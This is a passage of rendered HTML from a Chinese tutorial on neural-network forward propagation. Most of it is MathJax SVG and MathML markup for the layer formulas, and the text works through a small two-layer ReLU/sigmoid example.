571 442" aria-hidden="true"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D70E" d="M184 -11Q116 -11 74 34T31 147Q31 247 104 333T274 430Q275 431 414 431H552Q553 430 555 429T559 427T562 425T565 422T567 420T569 416T570 412T571 407T572 401Q572 357 507 357Q500 357 490 357T476 358H416L421 348Q439 310 439 263Q439 153 359 71T184 -11ZM361 278Q361 358 276 358Q152 358 115 184Q114 180 114 178Q106 141 106 117Q106 67 131 47T188 26Q242 26 287 73Q316 103 334 153T356 233T361 278Z" style="stroke-width: 3;"/></g></g></g></svg><mjx-assistive-mml unselectable="on" display="inline" style="top: 0px; left: 0px; clip: rect(1px, 1px, 1px, 1px); -webkit-touch-callout: none; -webkit-user-select: none; -khtml-user-select: none; -moz-user-select: none; -ms-user-select: none; user-select: none; position: absolute; padding: 1px 0px 0px 0px; border: 0px; display: block; width: auto; overflow: hidden;"><math xmlns="http://www.w3.org/1998/Math/MathML"><mi>σ</mi></math></mjx-assistive-mml></mjx-container> 是激活函数（如 ReLU、Sigmoid、Tanh 等），用于引入非线性。</p></li></ol><p>这个过程从输入层一直进行到输出层，最终输出预测值 <mjx-container class="MathJax" jax="SVG" style="direction: ltr; position: relative;"><svg style="overflow: visible; min-height: 1px; min-width: 1px; vertical-align: -0.464ex;" xmlns="http://www.w3.org/2000/svg" width="7.489ex" height="2.485ex" role="img" focusable="false" viewbox="0 -893.3 3310.2 1098.3" aria-hidden="true"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="TeXAtom" data-mjx-texclass="ORD"><g data-mml-node="mover"><g data-mml-node="mi"><path data-c="1D466" d="M21 287Q21 301 36 335T84 406T158 442Q199 442 224 419T250 355Q248 336 247 334Q247 331 231 288T198 191T182 105Q182 62 196 45T238 27Q261 27 281 38T312 61T339 94Q339 95 344 114T358 173T377 247Q415 397 419 404Q432 431 462 431Q475 431 483 424T494 412T496 403Q496 390 447 193T391 -23Q363 -106 294 -155T156 -205Q111 -205 77 -183T43 -117Q43 -95 50 -80T69 -58T89 -48T106 -45Q150 -45 150 -87Q150 -107 138 -122T115 -142T102 -147L99 -148Q101 -153 118 -160T152 -167H160Q177 -167 186 -165Q219 -156 247 -127T290 -65T313 -9T321 21L315 17Q309 13 296 6T270 -6Q250 -11 231 -11Q185 -11 150 11T104 82Q103 89 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z" style="stroke-width: 3;"/></g><g data-mml-node="mo" transform="translate(300.6,16) translate(-250 0)"><path data-c="5E" d="M112 560L249 694L257 686Q387 562 387 560L361 531Q359 532 303 581L250 627L195 580Q182 569 169 557T148 538L140 532Q138 530 125 546L112 560Z" style="stroke-width: 3;"/></g></g></g><g data-mml-node="mo" transform="translate(767.8,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z" style="stroke-width: 3;"/></g><g data-mml-node="msup" transform="translate(1823.6,0)"><g data-mml-node="mi"><path data-c="1D44E" d="M33 157Q33 258 109 349T280 441Q331 441 370 392Q386 422 416 422Q429 422 439 414T449 394Q449 381 412 234T374 68Q374 43 381 35T402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487Q506 153 506 144Q506 138 501 117T481 63T449 13Q436 0 417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157ZM351 328Q351 334 346 350T323 385T277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q217 26 254 59T298 110Q300 114 325 217T351 328Z" style="stroke-width: 3;"/></g><g data-mml-node="TeXAtom" transform="translate(562,363) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mo"><path data-c="5B" d="M118 -250V750H255V710H158V-210H255V-250H118Z" style="stroke-width: 3;"/></g><g data-mml-node="mi" transform="translate(278,0)"><path data-c="1D43F" d="M228 637Q194 637 192 641Q191 643 191 649Q191 673 202 682Q204 683 217 683Q271 680 344 680Q485 680 506 683H518Q524 677 524 674T522 656Q517 641 513 637H475Q406 636 394 628Q387 624 380 600T313 336Q297 271 279 198T252 88L243 52Q243 48 252 48T311 46H328Q360 46 379 47T428 54T478 72T522 106T564 161Q580 191 594 228T611 270Q616 273 628 273H641Q647 264 647 262T627 203T583 83T557 9Q555 4 553 3T537 0T494 -1Q483 -1 418 -1T294 0H116Q32 0 32 10Q32 17 34 24Q39 43 44 45Q48 46 59 46H65Q92 46 125 49Q139 52 144 61Q147 65 216 339T285 628Q285 635 228 637Z" style="stroke-width: 3;"/></g><g data-mml-node="mo" transform="translate(959,0)"><path data-c="5D" d="M22 710V750H159V-250H22V-210H119V710H22Z" style="stroke-width: 3;"/></g></g></g></g></g></svg><mjx-assistive-mml unselectable="on" display="inline" style="top: 0px; left: 0px; clip: rect(1px, 1px, 1px, 1px); -webkit-touch-callout: none; -webkit-user-select: none; -khtml-user-select: none; -moz-user-select: none; -ms-user-select: none; user-select: none; position: absolute; padding: 1px 0px 0px 0px; border: 0px; display: block; width: auto; overflow: hidden;"><math xmlns="http://www.w3.org/1998/Math/MathML"><mrow data-mjx-texclass="ORD"><mover><mi>y</mi><mo stretchy="false">^</mo></mover></mrow><mo>=</mo><msup><mi>a</mi><mrow data-mjx-texclass="ORD"><mo stretchy="false">[</mo><mi>L</mi><mo stretchy="false">]</mo></mrow></msup></math></mjx-assistive-mml></mjx-container>，其中 <mjx-container class="MathJax" jax="SVG" style="direction: ltr; position: relative;"><svg style="overflow: visible; min-height: 1px; min-width: 1px; vertical-align: 0;" xmlns="http://www.w3.org/2000/svg" width="1.541ex" height="1.545ex" role="img" focusable="false" viewbox="0 -683 681 683" aria-hidden="true"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D43F" d="M228 637Q194 637 192 641Q191 643 191 649Q191 673 202 682Q204 683 217 683Q271 680 344 680Q485 680 506 683H518Q524 677 524 674T522 656Q517 641 513 637H475Q406 636 394 628Q387 624 380 600T313 336Q297 271 279 198T252 88L243 52Q243 48 252 48T311 46H328Q360 46 379 47T428 54T478 72T522 106T564 161Q580 191 594 228T611 270Q616 273 628 273H641Q647 264 647 262T627 203T583 83T557 9Q555 4 553 3T537 0T494 -1Q483 -1 418 -1T294 0H116Q32 0 32 10Q32 17 34 24Q39 43 44 45Q48 46 59 46H65Q92 46 125 49Q139 52 144 61Q147 65 216 339T285 628Q285 635 228 637Z" style="stroke-width: 3;"/></g></g></g></svg><mjx-assistive-mml unselectable="on" display="inline" style="top: 0px; left: 0px; clip: rect(1px, 1px, 1px, 1px); -webkit-touch-callout: none; -webkit-user-select: none; -khtml-user-select: none; -moz-user-select: none; -ms-user-select: none; user-select: none; position: absolute; padding: 1px 0px 0px 0px; border: 0px; display: block; width: auto; overflow: hidden;"><math xmlns="http://www.w3.org/1998/Math/MathML"><mi>L</mi></math></mjx-assistive-mml></mjx-container> 是最后一层。</p><h4 id="简单例子">简单例子</h4><p>假设我们有一个两层神经网络（一个隐藏层），用于二分类：</p><ul><li>输入：2个特征 <mjx-container class="MathJax" jax="SVG" style="direction: ltr; position: relative;"><svg style="overflow: visible; min-height: 1px; min-width: 1px; vertical-align: -0.439ex;" xmlns="http://www.w3.org/2000/svg" width="5.57ex" height="1.439ex" role="img" focusable="false" viewbox="0 -442 2461.8 636" aria-hidden="true"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z" style="stroke-width: 3;"/></g><g data-mml-node="mn" transform="translate(605,-150) scale(0.707)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z" style="stroke-width: 3;"/></g></g><g data-mml-node="mo" transform="translate(1008.6,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z" style="stroke-width: 3;"/></g><g data-mml-node="msub" transform="translate(1453.2,0)"><g data-mml-node="mi"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z" style="stroke-width: 3;"/></g><g data-mml-node="mn" transform="translate(605,-150) scale(0.707)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z" style="stroke-width: 3;"/></g></g></g></g></svg><mjx-assistive-mml unselectable="on" display="inline" style="top: 0px; left: 0px; clip: rect(1px, 1px, 1px, 1px); -webkit-touch-callout: none; -webkit-user-select: none; -khtml-user-select: none; -moz-user-select: none; -ms-user-select: none; user-select: none; position: absolute; padding: 1px 0px 0px 0px; border: 0px; display: block; width: auto; overflow: hidden;"><math xmlns="http://www.w3.org/1998/Math/MathML"><msub><mi>x</mi><mn>1</mn></msub><mo>,</mo><msub><mi>x</mi><mn>2</mn></msub></math></mjx-assistive-mml></mjx-container></li><li>隐藏层：3个神经元，使用 ReLU 激活</li><li>输出层：1个神经元，使用 Sigmoid 激活</li></ul><p>向前传播过程：</p><ol><li><p>计算隐藏层：</p><mjx-container class="MathJax" jax="SVG" display="true" style="direction: ltr; display: block; text-align: center; margin: 1em 0; position: relative;"><svg style="overflow: visible; min-height: 1px; min-width: 1px; vertical-align: -0.566ex;" xmlns="http://www.w3.org/2000/svg" width="26.278ex" height="2.7ex" role="img" focusable="false" viewbox="0 -943.3 11614.8 1193.3" aria-hidden="true"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msup"><g data-mml-node="mi"><path data-c="1D467" d="M347 338Q337 338 294 349T231 360Q211 360 197 356T174 346T162 335T155 324L153 320Q150 317 138 317Q117 317 117 325Q117 330 120 339Q133 378 163 406T229 440Q241 442 246 442Q271 442 291 425T329 392T367 375Q389 375 411 408T434 441Q435 442 449 442H462Q468 436 468 434Q468 430 463 420T449 399T432 377T418 358L411 349Q368 298 275 214T160 106L148 94L163 93Q185 93 227 82T290 71Q328 71 360 90T402 140Q406 149 409 151T424 153Q443 153 443 143Q443 138 442 134Q425 72 376 31T278 -11Q252 -11 232 6T193 40T155 57Q111 57 76 -3Q70 -11 59 -11H54H41Q35 -5 35 -2Q35 13 93 84Q132 129 225 214T340 322Q352 338 347 338Z" style="stroke-width: 3;"/></g><g data-mml-node="TeXAtom" transform="translate(498,413) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mo"><path data-c="5B" d="M118 -250V750H255V710H158V-210H255V-250H118Z" style="stroke-width: 3;"/></g><g data-mml-node="mn" transform="translate(278,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z" style="stroke-width: 3;"/></g><g data-mml-node="mo" transform="translate(778,0)"><path data-c="5D" d="M22 710V750H159V-250H22V-210H119V710H22Z" style="stroke-width: 3;"/></g></g></g><g data-mml-node="mo" transform="translate(1572.5,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z" style="stroke-width: 3;"/></g><g data-mml-node="msup" transform="translate(2628.3,0)"><g data-mml-node="mi"><path data-c="1D44A" d="M436 683Q450 683 486 682T553 680Q604 680 638 681T677 682Q695 682 695 674Q695 670 692 659Q687 641 683 639T661 637Q636 636 621 632T600 624T597 615Q597 603 613 377T629 138L631 141Q633 144 637 151T649 170T666 200T690 241T720 295T759 362Q863 546 877 572T892 604Q892 619 873 628T831 637Q817 637 817 647Q817 650 819 660Q823 676 825 679T839 682Q842 682 856 682T895 682T949 681Q1015 681 1034 683Q1048 683 1048 672Q1048 666 1045 655T1038 640T1028 637Q1006 637 988 631T958 617T939 600T927 584L923 578L754 282Q586 -14 585 -15Q579 -22 561 -22Q546 -22 542 -17Q539 -14 523 229T506 480L494 462Q472 425 366 239Q222 -13 220 -15T215 -19Q210 -22 197 -22Q178 -22 176 -15Q176 -12 154 304T131 622Q129 631 121 633T82 637H58Q51 644 51 648Q52 671 64 683H76Q118 680 176 680Q301 680 313 683H323Q329 677 329 674T327 656Q322 641 318 637H297Q236 634 232 620Q262 160 266 136L501 550L499 587Q496 629 489 632Q483 636 447 637Q428 637 422 639T416 648Q416 650 418 660Q419 664 420 669T421 676T424 680T428 682T436 683Z" style="stroke-width: 3;"/></g><g data-mml-node="TeXAtom" transform="translate(1136.2,413) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mo"><path data-c="5B" d="M118 -250V750H255V710H158V-210H255V-250H118Z" style="stroke-width: 3;"/></g><g data-mml-node="mn" transform="translate(278,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z" style="stroke-width: 3;"/></g><g data-mml-node="mo" transform="translate(778,0)"><path data-c="5D" d="M22 710V750H159V-250H22V-210H119V710H22Z" style="stroke-width: 3;"/></g></g></g><g data-mml-node="mi" transform="translate(4561.2,0)"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z" style="stroke-width: 3;"/></g><g data-mml-node="mo" transform="translate(5355.4,0)"><path data-c="2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z" style="stroke-width: 3;"/></g><g data-mml-node="msup" transform="translate(6355.6,0)"><g data-mml-node="mi"><path data-c="1D44F" d="M73 647Q73 657 77 670T89 683Q90 683 161 688T234 694Q246 694 246 685T212 542Q204 508 195 472T180 418L176 399Q176 396 182 402Q231 442 283 442Q345 442 383 396T422 280Q422 169 343 79T173 -11Q123 -11 82 27T40 150V159Q40 180 48 217T97 414Q147 611 147 623T109 637Q104 637 101 637H96Q86 637 83 637T76 640T73 647ZM336 325V331Q336 405 275 405Q258 405 240 397T207 376T181 352T163 330L157 322L136 236Q114 150 114 114Q114 66 138 42Q154 26 178 26Q211 26 245 58Q270 81 285 114T318 219Q336 291 336 325Z" style="stroke-width: 3;"/></g><g data-mml-node="TeXAtom" transform="translate(462,413) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mo"><path data-c="5B" d="M118 -250V750H255V710H158V-210H255V-250H118Z" style="stroke-width: 3;"/></g><g data-mml-node="mn" transform="translate(278,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z" style="stroke-width: 3;"/></g><g data-mml-node="mo" transform="translate(778,0)"><path data-c="5D" d="M22 710V750H159V-250H22V-210H119V710H22Z" style="stroke-width: 3;"/></g></g></g><g data-mml-node="mstyle" transform="translate(7614.3,0)"><g data-mml-node="mspace"/><g data-mml-node="mo" transform="translate(8614.3,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z" style="stroke-width: 3;"/></g><g data-mml-node="mn" transform="translate(9003.3,0)"><path data-c="33" d="M127 463Q100 463 85 480T69 524Q69 579 117 622T233 665Q268 665 277 664Q351 652 390 611T430 522Q430 470 396 421T302 350L299 348Q299 347 308 345T337 336T375 315Q457 262 457 175Q457 96 395 37T238 -22Q158 -22 100 21T42 130Q42 158 60 175T105 193Q133 193 151 175T169 130Q169 119 166 110T159 94T148 82T136 74T126 70T118 67L114 66Q165 21 238 21Q293 21 321 74Q338 107 338 175V195Q338 290 274 322Q259 328 213 329L171 330L168 332Q166 335 166 348Q166 366 174 366Q202 366 232 371Q266 376 294 413T322 525V533Q322 590 287 612Q265 626 240 626Q208 626 181 615T143 592T132 580H135Q138 579 143 578T153 573T165 566T175 555T183 540T186 520Q186 498 172 481T127 463Z" style="stroke-width: 3;"/></g><g data-mml-node="mo" transform="translate(9725.5,0)"><path data-c="D7" d="M630 29Q630 9 609 9Q604 9 587 25T493 118L389 222L284 117Q178 13 175 11Q171 9 168 9Q160 9 154 15T147 29Q147 36 161 51T255 146L359 250L255 354Q174 435 161 449T147 471Q147 480 153 485T168 490Q173 490 175 489Q178 487 284 383L389 278L493 382Q570 459 587 475T609 491Q630 491 630 471Q630 464 620 453T522 355L418 250L522 145Q606 61 618 48T630 29Z" style="stroke-width: 3;"/></g><g data-mml-node="mn" transform="translate(10725.8,0)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z" style="stroke-width: 3;"/></g><g data-mml-node="mo" transform="translate(11225.8,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z" style="stroke-width: 3;"/></g></g></g></g></svg><mjx-assistive-mml unselectable="on" display="block" style="top: 0px; left: 0px; clip: rect(1px, 1px, 1px, 1px); -webkit-touch-callout: none; -webkit-user-select: none; -khtml-user-select: none; -moz-user-select: none; -ms-user-select: none; user-select: none; position: absolute; padding: 1px 0px 0px 0px; border: 0px; display: block; overflow: hidden; width: 100%;"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><msup><mi>z</mi><mrow data-mjx-texclass="ORD"><mo stretchy="false">[</mo><mn>1</mn><mo stretchy="false">]</mo></mrow></msup><mo>=</mo><msup><mi>W</mi><mrow data-mjx-texclass="ORD"><mo stretchy="false">[</mo><mn>1</mn><mo stretchy="false">]</mo></mrow></msup><mi>x</mi><mo>+</mo><msup><mi>b</mi><mrow data-mjx-texclass="ORD"><mo stretchy="false">[</mo><mn>1</mn><mo stretchy="false">]</mo></mrow></msup><mstyle scriptlevel="0"><mspace width="1em"></mspace></mstyle><mo stretchy="false">(</mo><mn>3</mn><mo>×</mo><mn>2</mn><mo stretchy="false">)</mo></math></mjx-assistive-mml></mjx-container><mjx-container class="MathJax" jax="SVG" display="true" style="direction: ltr; display: block; text-align: center; margin: 1em 0; position: relative;"><svg style="overflow: visible; min-height: 1px; min-width: 1px; vertical-align: -0.566ex;" xmlns="http://www.w3.org/2000/svg" width="16.561ex" height="2.7ex" role="img" focusable="false" viewbox="0 -943.3 7320 1193.3" aria-hidden="true"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msup"><g data-mml-node="mi"><path data-c="1D44E" d="M33 157Q33 258 109 349T280 441Q331 441 370 392Q386 422 416 422Q429 422 439 414T449 394Q449 381 412 234T374 68Q374 43 381 35T402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487Q506 153 506 144Q506 138 501 117T481 63T449 13Q436 0 417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157ZM351 328Q351 334 346 350T323 385T277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q217 26 254 59T298 110Q300 114 325 217T351 328Z" style="stroke-width: 3;"/></g><g data-mml-node="TeXAtom" transform="translate(562,413) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mo"><path data-c="5B" d="M118 -250V750H255V710H158V-210H255V-250H118Z" style="stroke-width: 3;"/></g><g data-mml-node="mn" transform="translate(278,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z" style="stroke-width: 3;"/></g><g data-mml-node="mo" transform="translate(778,0)"><path data-c="5D" d="M22 710V750H159V-250H22V-210H119V710H22Z" style="stroke-width: 3;"/></g></g></g><g data-mml-node="mo" transform="translate(1636.5,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z" style="stroke-width: 3;"/></g><g data-mml-node="mtext" transform="translate(2692.3,0)"><path data-c="52" d="M130 622Q123 629 119 631T103 634T60 637H27V683H202H236H300Q376 683 417 677T500 648Q595 600 609 517Q610 512 610 501Q610 468 594 439T556 392T511 361T472 343L456 338Q459 335 467 332Q497 316 516 298T545 254T559 211T568 155T578 94Q588 46 602 31T640 16H645Q660 16 674 32T692 87Q692 98 696 101T712 105T728 103T732 90Q732 59 716 27T672 -16Q656 -22 630 -22Q481 -16 458 90Q456 101 456 163T449 246Q430 304 373 320L363 322L297 323H231V192L232 61Q238 51 249 49T301 46H334V0H323Q302 3 181 3Q59 3 38 0H27V46H60Q102 47 111 49T130 61V622ZM491 499V509Q491 527 490 539T481 570T462 601T424 623T362 636Q360 636 340 636T304 637H283Q238 637 234 628Q231 624 231 492V360H289Q390 360 434 378T489 456Q491 467 491 499Z" style="stroke-width: 3;"/><path data-c="65" d="M28 218Q28 273 48 318T98 391T163 433T229 448Q282 448 320 430T378 380T406 316T415 245Q415 238 408 231H126V216Q126 68 226 36Q246 30 270 30Q312 30 342 62Q359 79 369 104L379 128Q382 131 395 131H398Q415 131 415 121Q415 117 412 108Q393 53 349 21T250 -11Q155 -11 92 58T28 218ZM333 275Q322 403 238 411H236Q228 411 220 410T195 402T166 381T143 340T127 274V267H333V275Z" transform="translate(736,0)" style="stroke-width: 3;"/><path data-c="4C" d="M128 622Q121 629 117 631T101 634T58 637H25V683H36Q48 680 182 680Q324 680 348 683H360V637H333Q273 637 258 635T233 622L232 342V129Q232 57 237 52Q243 47 313 47Q384 47 410 53Q470 70 498 110T536 221Q536 226 537 238T540 261T542 272T562 273H582V268Q580 265 568 137T554 5V0H25V46H58Q100 47 109 49T128 61V622Z" transform="translate(1180,0)" style="stroke-width: 3;"/><path data-c="55" d="M128 622Q121 629 117 631T101 634T58 637H25V683H36Q57 680 180 680Q315 680 324 683H335V637H302Q262 636 251 634T233 622L232 418V291Q232 189 240 145T280 67Q325 24 389 24Q454 24 506 64T571 183Q575 206 575 410V598Q569 608 565 613T541 627T489 637H472V683H481Q496 680 598 680T715 683H724V637H707Q634 633 622 598L621 399Q620 194 617 180Q617 179 615 171Q595 83 531 31T389 -22Q304 -22 226 33T130 192Q129 201 128 412V622Z" transform="translate(1805,0)" style="stroke-width: 3;"/></g><g data-mml-node="mo" transform="translate(5247.3,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z" style="stroke-width: 3;"/></g><g data-mml-node="msup" transform="translate(5636.3,0)"><g data-mml-node="mi"><path data-c="1D467" d="M347 338Q337 338 294 349T231 360Q211 360 197 356T174 346T162 335T155 324L153 320Q150 317 138 317Q117 317 117 325Q117 330 120 339Q133 378 163 406T229 440Q241 442 246 442Q271 442 291 425T329 392T367 375Q389 375 411 408T434 441Q435 442 449 442H462Q468 436 468 434Q468 430 463 420T449 399T432 377T418 358L411 349Q368 298 275 214T160 106L148 94L163 93Q185 93 227 82T290 71Q328 71 360 90T402 140Q406 149 409 151T424 153Q443 153 443 143Q443 138 442 134Q425 72 376 31T278 -11Q252 -11 232 6T193 40T155 57Q111 57 76 -3Q70 -11 59 -11H54H41Q35 -5 35 -2Q35 13 93 84Q132 129 225 214T340 322Q352 338 347 338Z" style="stroke-width: 3;"/></g><g data-mml-node="TeXAtom" transform="translate(498,413) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mo"><path data-c="5B" d="M118 -250V750H255V710H158V-210H255V-250H118Z" style="stroke-width: 3;"/></g><g data-mml-node="mn" transform="translate(278,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z" style="stroke-width: 3;"/></g><g data-mml-node="mo" transform="translate(778,0)"><path data-c="5D" d="M22 710V750H159V-250H22V-210H119V710H22Z" style="stroke-width: 3;"/></g></g></g><g data-mml-node="mo" transform="translate(6931,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z" style="stroke-width: 3;"/></g></g></g></svg><mjx-assistive-mml unselectable="on" display="block" style="top: 0px; left: 0px; clip: rect(1px, 1px, 1px, 1px); -webkit-touch-callout: none; -webkit-user-select: none; -khtml-user-select: none; -moz-user-select: none; 